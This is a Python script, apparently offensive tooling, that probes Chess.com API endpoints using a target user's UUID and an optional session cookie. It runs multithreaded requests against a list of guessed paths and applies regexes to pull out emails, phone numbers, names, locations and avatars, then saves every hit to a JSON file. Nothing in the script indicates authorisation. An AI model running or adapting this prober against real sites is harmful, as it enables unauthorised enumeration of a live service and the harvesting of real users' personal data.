import requests
import sys
import json
import re
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

BANNER = """
=== Chess.com Endpoint Prober ===
Goal: Discover which API endpoints leak PII
Method: Probe common endpoints with known UUIDs
================================================
"""

EMAIL_RE = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

ENDPOINT_LIST = [
    "/api/badge",
    "/api/user",
    "/api/profile",
    "/api/settings",
    "/api/account",
    "/api/v1/user",
    "/api/v2/user",
    "/api/v1/profile",
    "/api/v2/profile",
    "/api/users",
    "/api/profiles",
    "/api/member",
    "/api/members",
    "/api/player",
    "/api/players",
    "/api/account/settings",
    "/api/user/profile",
    "/api/profile/settings",
    "/api/notification",
    "/api/notifications",
    "/api/message",
    "/api/messages",
    "/api/friend",
    "/api/friends",
    "/api/follow",
    "/api/following",
    "/api/game",
    "/api/games",
    "/api/stats",
    "/api/leaderboard",
    "/api/club",
    "/api/clubs",
]

PII_PATTERNS = {
    "email": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
    "username_json": r'(?:"username"\s*:\s*"([^"]+))',
    "display_name": r'(?:"(?:display_name|name|full_name|nickname)"\s*:\s*"([^"]+))',
    "email_json": r'(?:"email"\s*:\s*"([^"]+@[^"]+))',
    "phone_json": r'(?:"phone(?:_number)?"\s*:\s*"([^"]+))',
    "location_json": r'(?:"(?:location|country|city|timezone|region)"\s*:\s*"([^"]+))',
    "id_json": r'(?:"(?:id|user_id|member_id|player_id)"\s*:\s*"([^"]+))',
    "avatar_json": r'(?:"(?:avatar|profile_picture|image_url|picture)"\s*:\s*"(https?://[^"]+)")',
    "bio_json": r'(?:"(?:bio|about|description|status)"\s*:\s*"([^"]{10,})")',
}

def scan_for_pii(text, source=""):
    findings = {}
    emails = re.findall(EMAIL_RE, text)
    if emails:
        findings["email_raw"] = list(set(emails))
    for ptype, pattern in PII_PATTERNS.items():
        matches = re.findall(pattern, text, re.IGNORECASE)
        if matches:
            findings[ptype] = list(set(matches))
    return findings

def probe(session, base_domain, endpoint, uid, cookies, headers, timeout=8):
    url = f"{base_domain}{endpoint}/{uid}"
    try:
        resp = session.get(url, cookies=cookies, headers=headers, timeout=timeout)
        pii = scan_for_pii(resp.text, url)
        content_type = resp.headers.get("content-type", "")
        return {
            "endpoint": endpoint,
            "uuid": uid,
            "url": url,
            "status": resp.status_code,
            "length": len(resp.text),
            "content_type": content_type,
            "pii_found": pii,
            "has_pii": len(pii) > 0,
            "body_preview": resp.text[:1000],
        }
    except Exception as e:
        return {"endpoint": endpoint, "uuid": uid, "url": url, "status": 0, "error": str(e), "pii_found": {}, "has_pii": False}

def main():
    print(BANNER)

    if len(sys.argv) < 3:
        print("Usage:")
        print("  python endpoint_prober.py <domain> <uuid> [options]")
        print()
        print("Example:")
        print("  python endpoint_prober.py https://chess.com abea117e-... --cookie session=abc")
        print()
        print("Options:")
        print("  --cookie COOKIE     Session cookie")
        print("  --threads N         Thread count (default: 20)")
        print("  --output FILE       Output file")
        print("  --endpoints FILE    Custom endpoint list (one per line)")
        return

    domain = sys.argv[1].rstrip("/")
    base_uuid = sys.argv[2]
    cookie_str = None
    threads = 20
    output_file = "endpoint_probe_results.json"
    custom_endpoints = None

    for i, arg in enumerate(sys.argv[3:], 3):
        if arg == "--cookie" and i + 1 < len(sys.argv):
            cookie_str = sys.argv[i + 1]
        elif arg == "--threads" and i + 1 < len(sys.argv):
            threads = int(sys.argv[i + 1])
        elif arg == "--output" and i + 1 < len(sys.argv):
            output_file = sys.argv[i + 1]
        elif arg == "--endpoints" and i + 1 < len(sys.argv):
            with open(sys.argv[i + 1], "r") as f:
                custom_endpoints = [line.strip() for line in f if line.strip()]

    endpoints = custom_endpoints if custom_endpoints else ENDPOINT_LIST

    cookies = None
    if cookie_str:
        parts = cookie_str.split("=", 1)
        cookies = {parts[0]: parts[1]} if len(parts) == 2 else None

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

    print(f"[*] Target: {domain}")
    print(f"[*] UUID: {base_uuid}")
    print(f"[*] Endpoints to probe: {len(endpoints)}")
    print(f"[*] Threads: {threads}\n")

    all_results = []
    pii_results = []

    with requests.Session() as session:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            fut_map = {executor.submit(probe, session, domain, ep, base_uuid, cookies, headers): ep for ep in endpoints}

            done = 0
            for fut in as_completed(fut_map):
                done += 1
                endpoint = fut_map[fut]
                r = fut.result()
                all_results.append(r)

                status_display = f"{r['status']}" if r['status'] else "ERR"
                pii_mark = "  <-- PII!" if r.get("has_pii") else ""
                print(f"  [{status_display:3s}] {endpoint:35s} ({r['length']} bytes){pii_mark}")

                if r.get("has_pii"):
                    pii_results.append(r)
                    print(f"         PII found: {list(r['pii_found'].keys())}")

    print(f"\n{'=' * 60}")
    print(f"PROBE COMPLETE")
    print(f"{'=' * 60}")

    accessible = [r for r in all_results if r.get("status") and r["status"] < 400]
    pii_count = len(pii_results)

    print(f"\nTotal endpoints: {len(endpoints)}")
    print(f"Accessible (status < 400): {len(accessible)}")
    print(f"Endpoints with PII: {pii_count}")

    if pii_results:
        print(f"\n--- ENDPOINTS WITH PII ---")
        for r in sorted(pii_results, key=lambda x: x["endpoint"]):
            print(f"  {r['endpoint']:35s} [{r['status']}] {list(r['pii_found'].keys())}")

        print(f"\n--- PII DETAILS ---")
        for r in pii_results:
            print(f"\n  {r['url']}")
            for ptype, vals in r["pii_found"].items():
                for v in vals[:3]:
                    print(f"    [{ptype}] {v}")

    output = {
        "timestamp": datetime.utcnow().isoformat(),
        "domain": domain,
        "uuid": base_uuid,
        "total_endpoints": len(endpoints),
        "accessible": len(accessible),
        "pii_endpoints": pii_count,
        "results": all_results,
        "pii_hits": pii_results
    }

    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(output, f, indent=2, default=str)
    print(f"\n[+] Results saved to {output_file}")

if __name__ == "__main__":
    main()
